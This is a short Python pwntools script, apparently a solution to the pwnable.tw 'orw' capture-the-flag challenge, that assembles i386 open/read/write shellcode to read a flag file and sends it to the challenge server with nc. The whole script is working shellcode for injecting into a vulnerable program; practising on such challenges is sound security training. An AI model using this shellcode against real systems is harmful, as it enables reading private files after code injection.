from pwn import *

#shellcode = shellcraft.i386.linux.echo("Hello!", 1)

shellcode = shellcraft.i386.linux.open('/home/orw/flag')
shellcode += shellcraft.mov('edi', 'eax')
shellcode += shellcraft.i386.linux.read('edi', 'esp', 64)
shellcode += shellcraft.i386.linux.write(1, 'esp', 64)


#shellcode = shellcraft.i386.linux.readfile('/root/flag', 'edi')

print asm(shellcode)
#print shellcode






#python shellcode.py | nc chall.pwnable.tw 10001
